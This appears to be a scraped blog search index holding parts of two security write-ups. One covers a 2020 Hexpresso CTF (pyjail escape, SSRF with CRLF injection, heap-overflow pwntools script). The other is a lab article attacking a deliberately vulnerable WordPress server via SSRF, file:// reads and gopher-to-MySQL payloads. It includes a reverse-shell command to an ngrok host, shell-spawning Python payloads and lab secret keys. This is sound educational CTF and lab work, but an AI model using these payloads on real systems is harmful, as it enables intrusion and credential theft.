▒ ░▒░ ░ ░ ░ ░\\░ ░▒ ░░▒ ░ ░▒ ░ ▒░ ░ ░ ░░ ▒ ░ ░░ ░▒ ░ ░ ░ ▒ ▒░ ▒ ░ ░ ▒ ░░░▒ ░ ░ ▒ ░▒░ ░ ░ ░ ░ ░▒ ░ ▒░ ░ ░ ░ ░ ░░ ░ ░ ░ ░ ░ ░░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ▒ ░ ░ ▒ ░ ░ ░ ░░ ░ ░ ░░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ k k Well done buddy !!!! Next step : https{//ctf.hexpresso.fr/6bd1d24ab3aa08784f868a533bcdc215 https://ctf.hexpresso.fr/6bd1d24ab3aa08784f868a533bcdc215 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:4:4","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"V. Step 5 - PYJAIL 4 FUN Event Challenge Category Solves CatureTheFic Step 5 PyJail 234 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:5:0","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"V.1. Etat de l’art On commence cette épreuve avec une archive contenant des certificats ssl et une commande socat: En se connectant, la première chose que je teste est d’afficher une chaine de caractère: Visiblement, il n’aime pas les simples quotes. Au final, avec la syntaxe suivante il est possible d’afficher la chaine de caractère: '+print(\"hello\")+' ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:5:1","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"V.2. Récupération du code Maintenant qu’on peut executer du python, il est possible de pop un shell grâce à la librairie pty. '+__import__(\"pty\").spawn(\"sh\")+' Cet accès shell permet de récupérer le code du challenge, situé dans “main.py”: #!/usr/bin/env python import os SUCCESS = \"Good flag !\" FAIL = \"Bad flag !\" def get_flag(): flag = os.environ.get(\"FLAG\", \"FLAG{LOCAL_FLAG}\") os.environ.update({\"FLAG\": \"\"}) return flag def get_input(): return eval(f\"\"\"'{input(\"\u003e\")}'\"\"\") def main(): flag = get_flag() if flag == get_input(): print(SUCCESS) else: print(FAIL) if __name__ == \"__main__\": main() Le shell timeout au bout de quelque seconde en permanence, ce qui est très embêtant pour faire son énumération. Grâce à la commande nohup sous Linux, il est possible de créer des process indépendamment de l’utilisateur. C’est à dire que si je fais un reverse shell, il sera accessible même si je timeout. Avec ngrok, pas besoin de VPS pour récupérer un shell. L’article de TheLaluka en parle bien: https://thinkloveshare.com/en/hacking/ngrok_your_dockersploit/ Le but de ngrok est d’ouvrir une socket TCP sur internet bindé à un ncat en écoute. '+__import__(\"pty\").spawn(\"sh\")+' nohup nc 0.tcp.ngrok.io 16368 -e /bin/sh \u003e/dev/null 2\u003e\u00261 \u0026 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:5:2","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"V.3. Analyse de la pyjail La fonction get_flag() de la pyjail est vraiment inréressante: def get_flag(): flag = os.environ.get(\"FLAG\", \"FLAG{LOCAL_FLAG}\") os.environ.update({\"FLAG\": \"\"}) return flag flag = os.environ.get(\"FLAG\", \"FLAG{LOCAL_FLAG}\") : Récupère la valeur de la variable d’environnement “FLAG” et la met dans la variable “flag”; os.environ.update({\"FLAG\": \"\"}) : Va clear la variable d’environnement “FLAG”; return flag : Retourne la valeur de la fonction flag. Donc ça veut dire que le flag présent dans la variable “flag” est toujours en mémoire lors de la première exécution. def main(): flag = get_flag() if flag == get_input(): Quand le script attend une input, le flag est présent en mémoire. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:5:3","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"V.4. Debug all the things En cherchant différents modules, on tombe sur le module pdb de python qui est le debugger python. Grâce à l’injection de python dans le programme, il est possible de debug directement le script: '+print(__import__(\"pdb\").set_trace())+' n : Instruction suivante; l : Affiche les sources dans la contexte actuel; p var : Affiche le contenu de la variable “var”. Il suffit de passer aux “instructions” suivantes jusqu’à attérir dans la fonction “main()” et afficher le contenu de la variable “flag”. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:5:4","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"V.5. Flag http://c4ffddcc437c5df3e6d681e7cafab510.hexpresso.fr ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:5:5","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"V.6. Bonus En bonus, il est possible de récupérer le flag plus facilement: En effet, comme le programme va chercher son flag dans une variable d’environnement, un des process doit l’avoir encore en mémoire. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:5:6","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"VI. Step 6 - The Host fetcher Event Challenge Category Solves CaptureTheFic Step 6 Web 184 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:6:0","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"VI.1. Etat des lieux On commence ce challenge avec un site web. Visiblement il attend une URL en entrée et affiche le retour dans l’Iframe situé sous le bouton “submit”. Ce challenge ressemble beaucoup à une SSRF. Le but va être de voir s’il est possible de taper sur le localhost: En l’occurence, 127.0.0.1 est blacklisté. Une technique courante est de passer par l’ipv6, [::]. L’iframe renvoit le contenu du port 80, c’est une excellente nouvelle. De plus, les sources de la page nous apprend l’existence d’un endpoint secret: [::]/secret On sait donc sur quoi taper pour avoir le flag. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:6:1","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"VI.2. Request-ception En essayant de taper directement sur le endpoint secret, ce dernier renvoie une 404. Cependant, si on y passe un paramètre aléatoire, alors un message plus verbeux apparait. Il faut donc trouver un moyen de set le cookie “GOSESSION” dans la SSRF. Pour celà, il est possible d’injecter des CRLF et construire une requête HTTP: [::]/secret?a=1 HTTP/1.1\\r\\nCookie: GOSESSION=test En principe, la requête utilisée pour la SSRF sera passée avec cette en-tête: Finalement, avec l’injection CRLF dans le payload de la SSRF il est possible de modifier les en-tete et ainsi obtenir le flag. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:6:2","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"VI.3. Flag https://ctf.hexpresso.fr/219058289d8699adc0b119374c2fc5bc ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:6:3","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"VII. Step 7 - PWN me I’m famous Event Challenge Category Solves CatureTheFic Step 7 Pwn 12 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:7:0","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"VII.1. Etat des lieux On commence donc cette dernière épreuve par un zip chiffré: Comme tout CTFer qui se respect, toujours faire un peu d’OSINT sur l’équipe orga. Et ça a payé! En effet, sur le gist de chaign_c, il y a un dockerfile: FROM ubuntu:xenial # http://phusion.github.io/baseimage-docker/ RUN apt update \u0026\u0026 apt install -y socat # This ubuntu is required because we need a very specific version of glibc2.23 # FROM phusion/baseimage:0.11 RUN useradd -ms /bin/bash ctf USER ctf COPY ./chall /chall COPY ./flag.txt / EXPOSE 80/tcp CMD socat -d -d TCP-LISTEN:4242,reuseaddr,fork EXEC:/chall/heapme https://gist.github.com/nongiach/257e5103ef21235d56926bc053af38dc Il est vrai que ça ressemble beaucoup au challenge actuel. Ce Dockerfile ne nous apprend pas grand chose, sauf qu’il tourne avec une image ubuntu:xenial. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:7:1","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"VII.2. Cassage du zip Lors du listing des fichiers dans l’archive, on a pu voir la libc-2.23.so. Selon l’algo de ZIP, il est possible de faire du clair connu avec pkcrack. Pour extraire la libc du docker, il suffit de faire un volume partagé entre l’hote et le container: Le tool pkcrack a besoin d’un élément dans le zip, du zip en clair de cet élément et finalement déchiffrer le reste du zip. Maintenant que le zip est déchiffré, il faut réussir le “heapme” ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:7:2","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"VII. Pwn time (enfin presque) Lors de l’execution du binaire on remarque que la fonction alarm est appelé ce qui est plutot embetant quand on essaie d’analyser le comportement d’un binaire. Pour contourner ce problème on modifie juste l’appel de cette fonction par une série de nop Le binaire patché: http://cloud.id-iot.team/s/42r2nxx7N54PBp8 En analysant le code on remarque que le programme permet de créer un disk de taille donnée par l’utilisateur: Le programme alloue la taille donnée: Cependant lorsque le programme permet d’écrire dedans il oublie de checker la taille ce qui permet à l’utilisateur d’écraser les données suivantes de la heap: Pour rappel lorsque l’on alloue de la mémoire dans la heap la structure de données est la suivante: |size|data|size|data... Lorsqu’un chunk est libréré par free il insère le pointeur du bloc précédent. |size|pointeur|data_restante|size... Tout ceci s’applique seulement sur des allocations de petites tailles (fastbin). Maintenant si on s’interesse à ce qui est alloué dans ces chunks, on remarque que c’est la classe Disk. Les 16 premiers bytes contiennent les adresses des fonctions de la classe. Autrement dit, read et write. Connaisant la taille allouée lors de la création d’un disque on peut réécrire la taille du prochain bloc de la heap. Ensuite, il est possible d’écrire une nouvelle adresse pour la fonction read permettant de sauter à l’adresse écrite lors de l’overflow: Maintenant, il est nécessaire de leak la PIE pour s’avoir où sauter. taille de 1 pour disque = 24 bytes de données 33ème byte adresse du prochain disk 8 premier bytes de cette meme adresse contient l’adresse de read 8 prochain write //33ème byte fonction read //41ème byte fonction write cf photo pour un peu plus de précision: from pwn import * def createdisk(index, size): print(sh.recv()), sh.sendline(\"0\") print(0) print(sh.recv()), sh.send(\"%d\\n\" % size) print(size) print(sh.recv()), sh.send(\"%d\\n\" % index) print(sh.recvline()), def writedisk(index, data): print(sh.recv()), sh.sendline(\"2\") print(2) print(sh.recv()), sh.send(\"%d\\n\" % index) print(sh.recv()), sh.send(\"%s\\n\" % data) print(data) def readdisk(index): print(sh.recv()), sh.sendline(\"1\") print(1) print(sh.recv()), sh.send(\"%d\\n\" % index) print(index) a=sh.recvline() a=sh.recvline() print(len(a) - len(\"Data: \")) print(a.decode('utf-8')) for i in a: print(\"%x \" % (ord(i))), #print(len(a)) sh = process('./heapme_patched') createdisk(0, 1) createdisk(1, 1) # to jump AAAA #buffer='a'*23 #buffer+=chr(0x21) #buffer+='\\0'*8 #buffer+='a'*5 buffer='a'*23 buffer+=chr(0x21) buffer+='\\x01'*9 writedisk(0, buffer) readdisk(0) readdisk(1) ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:7:3","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Posts"],"content":"This article talks about setting up an infrastructure in order to attack it and investigate on it. The main purpose is level up in red/blue team methodology.","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":" In this article, I will introduce you to Odie’s misfortunes. Odie is a final year student at ENSIBS Cyberdefense (France). He is also the biggest fan of the famous band: Iron Maiden. In addition to that, he built a small fan website for them on his Virtual Private Server. Given that, Odie is a poor student, he only owns one VPS for his tests, courses and others stuff. But, Odie comes from the most prestigious school in cyberdefense, then he knows how to protect himself against awful hackers… Well, almost. We will see how the Odie website got attacked and we will try to find some evidence about the attack in memory. This is what we will try to see together in this article. First of all, I’m not an expert whether in red or blue team, not at all. The goal of this little practical exercises is learning new things and try to improve my skill in pentest and incident response. If you got any comments, feel free to contact me! :D Thanks to SIben for helping me when I was trying to find a name for this article! UPDATE 1 XX/XX/XXXX: Arnaud ZOBEC told me that I could have done a timeline of the attacked system before RAM dump extraction. In order to correlate file schedule. UPDATE 2 XX/XX/XXXX: Fabian RODES advised me to detail a little more the “Action plan” part with: SSH configuration hardening PHP configuration and Apache2 hardening (+ ModSecurity) WordPress hardening (configuration + iTheme Security plugin) Installing a reverse proxy and possibly blocking via geoip Installing fail2ban on SSH and Apache2 UPDATE 3 XX/XX/XXXX: Laluka told me it would be nice to add some stuff like the arbitrary PHP code. Setting up the environment Before attacking the server, here are its specifications: Debian 9 Apache2 server MariaDB PHP 7 I will share with you the Linux commands that Odie made. Perhaps you will find his\u0026 choices interesting… Or not! During Debian installation, Odie only installed SSH server. When the system is properly installed, Odie did updates/upgrades and put his user in sudo group, more convenient. $ su root # apt update # apt upgrade # apt install sudo vim curl python python-pip # usermod -aG sudo odie # reboot Now, comes the time to install and set up the web server, database and PHP for the future WordPress: $ sudo apt install mariadb-client mariadb-server $ sudo su # mysql_secure_installation MySQL root password: mysqlroot Remove anonymous users: Y Disallow root login remotely: Y Remove test database and access to it: Y Reload priv: Y # mysql MariaDB [(none)]\u003e create database wp_db; Query OK, 1 row affected (0.00 sec) MariaDB [(none)]\u003e CREATE USER 'wp_mysql_user'@'localhost' IDENTIFIED BY ''; Query OK, 0 rows affected (0.00 sec) MariaDB [(none)]\u003e GRANT ALL PRIVILEGES ON *.* to 'wp_mysql_user'@'localhost'; Query OK, 0 rows affected (0.00 sec) MariaDB [(none)]\u003e FLUSH PRIVILEGES; Query OK, 0 rows affected (0.00 sec) MariaDB [(none)]\u003e quit Bye # sudo apt install php7.0 php7.0-mysql apache2 libapache2-mod-php7.0 $ echo \"\u003c?php echo 'bite de poulet'; ?\u003e\" \u003e test.php $ curl 127.0.0.1/test.php bite de poulet As Odie has been computer science security courses, he takes great care to run mysql_secure_installation to set a password on MySQL root user, remove useless data, and disable remote connection for the root user. In addition, he knows that it’s a bad habit to work with the root user. Then he created a specific MySQL user for his WordPress: wp_mysql_user. Talking about WordPress, Odie installed it like that: $ cd /var/www/html $ wget https://wordpress.org/latest.tar.gz $ file latest.tar.gz latest.tar.gz: gzip compressed data, last modified: Wed Dec 19 23:24:07 2018, from Unix $ tar xvfz latest.tar.gz $ mv wordpress/* . $ sudo chown -R www-data:www-data /var/www/html $ sudo find /var/www/html -type d -exec chmod 755 {} \\; $ sudo find /var/www/html -type f -exec chmod 644 {} \\; $ sudo rm index.html Rights are well assigned, we have 755 on all folders, 644 on files and the owner of everything in /var/www/html folder is www-data. Eve","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:0:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Fingerprinting This step will allow the attacker to get an accurate idea of the targeted information system. This will allow him to develop some advanced attacks against the server and get access or confidential data. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:1:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"WordPress As the attacker, we know there is a website, a WordPress. There are some small interesting features on this kind of CMS, such as user enumeration: http://192.168.122.147/?author=1 The above URL redirects us to: http://192.168.122.147/index.php/author/eddiethehead/ We know the first user of this WordPress: eddiethehead. Haax did a great article about “vulnerabilities” or dangerous features on WordPress, and he presents how to prevent them: https://haax.fr/en/articles/best-security-practice-wordpress-installation/ At least, the WordPress is up to date. Wappalyzer is a Firefox plugins which display versions of solutions used in the visited website. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:1:1","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Nmap The next scan is not very stealthy, even not at all. It’s red team but not too much red team… :') host $ sudo nmap -p- -sS -sV -O -oA nmap 192.168.122.147 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-27 03:51 UTC Nmap scan report for 192.168.122.147 Host is up (0.00024s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0) 80/tcp open http Apache httpd 2.4.25 ((Debian)) MAC Address: 52:54:00:64:C8:8F (QEMU virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.67 seconds This scan will test all TCP ports of the machine (from 1 to 65535) and will try to determine the services and associated versions. Finally, I export these reports in gnmap, nmap and xml format. Pro tip: to make easier large nmap scans reading: host $ xsltproc nmap.xml \u003e nmap.html This tool will convert the XML file to an HTML file similar to: ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:1:2","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Bruteforce? We could try to brute-force the SSH with eddiethehead or oddie as username, but that wouldn’t be very discreet. So we’re going to try something much more quiet: brute-force the files at the root with DirBuster. Yes I know, it’s not quiet, but well, I’m sure Odie won’t see his logs…. At least for the moment. We use 40 threads because, well, I have already generated logs, then let’s continue in that way. I will use the “medium” wordlist provided with DirBuster, which never really disappointed me. And finally, we will only look for PHP and text files in the root folder, without being recursive. If there are no new hypotheses at the end of this first brute force, then maybe I will dig deeper. But for the moment, there are no advantages in being recursive. After only 8500 requests, a file got my attention: test.php. It is not a default WordPress file: Let’s take a look at it: ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:1:3","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Exploitation A file checker, let’s see what happens if I query for maki.bzh (totally random choice obviously :D). We can only test local files. Let’s try with the index.php file: Hmmm… It includes the webpage, we might think there is a file inclusion somewhere! ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:2:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"LFI, RCE or SSRF? Indeed, we can think of a Local File Inclusion, a Remote Command Execution or Server Side Request Forgery… But thanks to the output verbosity, we assume this script is using curl: Let’s try to change the protocol used, something like file:// instead of http://. If we don’t miss the localhost condition, it should work: file://localhost/etc/passwd This application allows us to include arbitrary file, great. By the way, there is a user called odie on the system. I will display the content of test.php, just to be clear about the vulnerability: file://localhost/var/www/html/test.php \u003c?php include_once \"config_test.php\"; ?\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eSuper curling\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"test.php\" method=\"post\"\u003e URL Checker - Beta: \u003cinput type=\"text\" name='url' /\u003e \u003c/form\u003e \u003c?php if (isset($_POST['url'])\u0026\u0026!empty($_POST['url'])) { $url = $_POST['url']; $content_url = getUrlContent($url); } else { $content_url = \"\"; } if(isset($_GET['debug'])) { show_source(__FILE__); } ?\u003e \u003c/body\u003e \u003c/html\u003e Same operation to get the config_test.php content: file://localhost/var/www/html/config_test.php \u003c?php function safe($url) { $tmpurl = parse_url($url, PHP_URL_HOST); if($tmpurl != \"localhost\" and $tmpurl != \"127.0.0.1\") { var_dump($tmpurl); die(\"\u003ch1\u003eOnly access to localhost\u003c/h1\u003e\"); } return $url; } function getUrlContent($url){ $url = safe($url); $url = escapeshellarg($url); $pl = \"curl -v \".$url; echo $pl; $content = shell_exec($pl); echo $content; return $content; } ?\u003e No more doubt, we got an SSRF in front of us. The RCE is not possible because of escapeshellarg(); function in PHP. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:2:1","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Server Side Request Forgery So now that I know there is an SSRF, we have to find a compatible service to interact with the system. There is a WordPress installed, then we can think that MySQL is being used. Let’s try to get the configuration file from the CMS: file://localhost/var/www/html/wp-config.php \u003c?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to \"wp-config.php\" and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define('DB_NAME', 'wp_db'); /** MySQL database username */ define('DB_USER', 'wp_mysql_user'); /** MySQL database password */ define('DB_PASSWORD', ''); /** MySQL hostname */ define('DB_HOST', 'localhost'); /** Database Charset to use in creating database tables. */ define('DB_CHARSET', 'utf8mb4'); /** The Database Collate type. Don't change this if in doubt. */ define('DB_COLLATE', ''); /**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */ define('AUTH_KEY', ')Rd+$da6g*B/tnJv#L[l$Ms3O+;YGx5(;fd$%eA16\u0026Tc;6Gh|!nnrv23K1B\u003e/=C?'); define('SECURE_AUTH_KEY', 'x8K1X9U?.Kf!sxlL0Mt6\u00265 -wa,`\u003eHjBhp,j@LWyIIcwW#U)`m.C(6{v)EKfl|!\u003c'); define('LOGGED_IN_KEY', '~ZW7f:RWz,6s?fXB=EqZ/$j.d]@d^{l=q1SnCySLm,$]9Y9B\u003elq n?]S\u003e10=F`9c'); define('NONCE_KEY', '@rs_~hBZ2 ;~A6/eH7C\u0026Q@JB}Af$IF=N5_CbuXq?DT|_n{TsFq|_g}[I\u003c)juXM=i'); define('AUTH_SALT', 'SbuXoB.8TYTm`%WEKRN/9Me8O9C\u003e]K((y}s/3~IwpMBTrI6(\u0026JiD0\u003cnuf[huStMI'); define('SECURE_AUTH_SALT', 'w(wnD$yjnc@z6]Kal{.=Kv~G5{u$j=ZnKaN,#`Dl7xbS_(3OVi~w]0.Hk;wQ#lbB'); define('LOGGED_IN_SALT', '-1.h]p gm?rf1?6byNfAbK:VJ}3x\u0026dx2Gf-QS%a\u003c/GHh8t{to1T5a~lQ=408,PyM'); define('NONCE_SALT', '4v6W.P-H:4}wJdOo9XNtO0_eCp e9xpSi4m5Q6\u003chtwNo`JKynG2iq8A}[VCh[\u0026eS'); /**#@-*/ /** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */ $table_prefix = 'wp_'; /** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the Codex. * * @link https://codex.wordpress.org/Debugging_in_WordPress */ define('WP_DEBUG', false); /* That's all, stop editing! Happy blogging. */ /** Absolute path to the WordPress directory. */ if ( !defined('ABSPATH') ) define('ABSPATH', dirname(__FILE__) . '/'); /** Sets up WordPress vars and included files. */ require_once(ABSPATH . 'wp-settings.php'); \u003c/body\u003e \u003c/html\u003e There are some interesting things to notice: MySQL is used ; There is no password on the MySQL user wp_mysql_user ; The database name is wp_db. There are many articles on the internet about SSRF exploitation with MySQL. Let’s see how I can take advantage of this. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:2:2","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"SSRF to SQL injection On my laptop, I installed MySQL (MariaDB), created a database called wp_db, created a user called wp_mysql_user without authentication password, downloaded and install WordPress: host $ mysql -u root -p MariaDB \u003e create database wp_db; MariaDB \u003e CREATE USER 'wp_mysql_user'@'localhost' IDENTIFIED BY ''; MariaDB \u003e GRANT ALL PRIVILEGES ON *.* to 'wp_mysql_user'@'localhost'; Once my personal environment is similar to the target one, here is my MySQL request to get the Wordpress credentials: host $ mysql -u wp_mysql_user MariaDB [(none)]\u003e select user_login,user_pass from wp_db.wp_users; +--------------+------------------------------------+ | user_login | user_pass | +--------------+------------------------------------+ | test_user | SomeWordpressHash | +--------------+------------------------------------+ 1 row in set (0.00 sec) host $ mysql -h localhost -u wp_mysql_user -e \"select user_login,user_pass from wp_db.wp_users;\" +--------------+------------------------------------+ | user_login | user_pass | +--------------+------------------------------------+ | test_user | SomeWordpressHash | +--------------+------------------------------------+ The second request is just a one liner specifying that it is necessary to go through the localhost. To execute SQL commands, I will need to look at the query in Wireshark and understand which data is sent and how. The following article will probably explain this better than me: https://paper.seebug.org/510/ The mentioned article shows us how to simulate the MySQL request in a local environment, retrieve data transmitted and replay them. This means that MariaDB has no specific protection against regame or authenticity. Displayed bytes at the end of the above GIF will be used as payload to get the username and hashed password from the WordPress database. With a little python script, stolen to our asian friends, I will be able to generate the complete payload: #!/usr/bin/python2 def result(s): a = [s[i:i+2] for i in xrange(0, len(s), 2)] return \"gopher://127.0.0.1:3306/_%\" + \"%\".join(a) if __name__ == \"__main__\": import sys s = sys.argv[1] print result(s) In fact, this python script will just add gopher://127.0.0.1:3306/_ in front of our payload and add a % every two characters. Otherwise, the web server will not take the data as hex data. host $ cat ssrf_mysql2 | xxd -p | tr -d '\\n' ac00000185a23f000000000121000000000000000000000000000000000000000000000077705f6d7973716c5f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404393230360f5f636c69656e745f76657273696f6e0731302e312e3337095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c300000000373656c65637420757365725f6c6f67696e2c757365725f706173732066726f6d2077705f64622e77705f75736572730100000001 host $ ./parse.py ac00000185a23f000000000121000000000000000000000000000000000000000000000077705f6d7973716c5f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404393230360f5f636c69656e745f76657273696f6e0731302e312e3337095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c300000000373656c65637420757365725f6c6f67696e2c757365725f706173732066726f6d2077705f64622e77705f75736572730100000001 